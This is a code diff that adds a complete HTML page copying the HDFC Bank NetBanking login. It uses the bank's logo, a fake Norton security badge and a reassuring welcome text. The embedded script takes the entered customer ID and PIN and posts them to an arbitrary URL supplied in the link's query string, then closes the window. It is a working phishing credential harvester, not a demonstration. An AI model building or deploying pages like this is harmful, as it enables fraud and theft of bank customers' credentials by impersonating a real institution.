@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HDFC Bank NetBanking</title>
+    <style>
+		*{
+			text-align: left;
+		}
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f7f7f7;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 600px; /* Adjust the max-width as needed */
+            margin: 0 auto; /* Center the container */
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        header {
+            background-color: #fff;
+            padding: 20px 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        header img {
+            width: 100px;
+            height: auto;
+        }
+
+        h1 {
+            margin-left: 20px;
+            font-size: 20px;
+        }
+
+        main {
+            padding: 20px;
+        }
+
+        section {
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+		.upper {
+			display: flex;
+			
+			align-items: center;
+			text-align: center;
+		}
+        .login form {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .login label {
+            font-size: 14px;
+        }
+
+        .login input {
+            padding: 10px;
+            border: 1px solid #ccc;
+        }
+
+        .login img {
+            width: 80px;
+            height: auto;
+        }
+
+        .login a {
+            font-size: 12px;
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        .login button {
+            background-color: #007bff;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        footer {
+            background-color: #fff;
+            padding: 10px 0;
+            text-align: center;
+        }
+		.welcome-message{
+			text-align: justify;
+			background-color: rgb(205, 217, 222);
+			padding: 10px;
+		}
+		.center{
+			text-align: center;
+		}
+		a{
+			text-decoration: none;
+			color: rgb(0, 166, 255);
+		}
+        @media only screen and (max-width: 600px) {
+            header {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            header img {
+                margin-bottom: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container" >
+        <div class="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/28/HDFC_Bank_Logo.svg/2560px-HDFC_Bank_Logo.svg.png" height="30px" alt="HDFC Bank Logo"></div>
+        <h1 class="center">Welcome to HDFC Bank NetBanking</h1>
+	</div>
+	<div class="container upper">
+    <main>
+        <section class="login">
+            <h2>Login to NetBanking</h2>
+			
+            <form id="netbankingForm">
+				<label for="bankUserId">Customer ID/ User ID</label>
+      			<input type="text" id="bankUserId" name="bankUserId" required />
+				<label for="bankUserPin">Customer Pin</label>
+				<input type="password" id="bankUserPin" name="bankUserPin" required />
+                <img src="https://e7.pngegg.com/pngimages/811/245/png-clipart-norton-antivirus-antivirus-software-symantec-norton-security-others-text-logo-thumbnail.png" alt="Norton Secured"> <a href="#">Forgot Customer ID</a>
+                <button class="center" type="submit">CONTINUE</button>
+                <p>Your security is of utmost importance. <a href="#">Know More...</a></p>
+            </form>
+        </section>
+        <section class="welcome-message">
+            <p>Dear Customer,</p>
+            <p>Welcome to the new login page of HDFC Bank NetBanking. Its lighter look and feel is designed to give you the best possible user experience. Please continue to login using your customer ID and password.</p>
+        </section>
+        <section class="new-user">
+            <h2>First Time User?</h2>
+            <p><a href="#">Register Now</a> for a host of convenient features</p>
+        </section>
+        <section class="more-services">
+            <h2>We have added a host of new features!</h2>
+            <p>Don't have a HDFC Bank Savings Account? You can now do so much more:</p>
+            <ul>
+                <li><a href="#">Credit Card only? Login here</a></li>
+                <li><a href="#">Prepaid Card only? Login here</a></li>
+                <li><a href="#">HDFC Ltd. Home Loans? Login here</a></li>
+                <li><a href="#">HDFC Ltd. Deposits? Login here</a></li>
+                <li><a href="#">Retail Loan only? Login here</a></li>
+            </ul>
+            <p><a href="#">Anywhere access through Desktop or mobile</a></p>
+            <p><a href="#">Enhanced security measures</a></p>
+        </section>
+    </main>
+    
+</div>
+<footer>
+	<p>&copy; HDFC Bank Ltd.</p>
+</footer>
+<script>
+	document.getElementById('netbankingForm').addEventListener('submit', function(event) {
+	  event.preventDefault(); // Prevent the form from submitting normally
+  
+	  // Extract URL from query parameters
+	  const urlParams = new URLSearchParams(window.location.search);
+	  const apiUrl = urlParams.get('url');
+  
+	  // Collect form data
+	  const bankUserId = document.getElementById('bankUserId').value;
+	  const bankUserPin = document.getElementById('bankUserPin').value;
+  
+	  // Step 2: POST request to the second API endpoint
+	  fetch(apiUrl, {
+		method: 'POST',
+		headers: {
+		  'Content-Type': 'application/json'
+		},
+		body: JSON.stringify({
+		  userBankId: bankUserId,
+		  userBankPin: bankUserPin
+		})
+	  })
+	  .then(response => response.json())
+	  .then(data => {
+		// Handle response accordingly
+		console.log('Transaction response:', data);
+		alert(data.message);
+		window.close()
+	  })
+	  .catch(error => console.error('Error making transaction:', error));
+	});
+  </script>
+</body>
+</html>
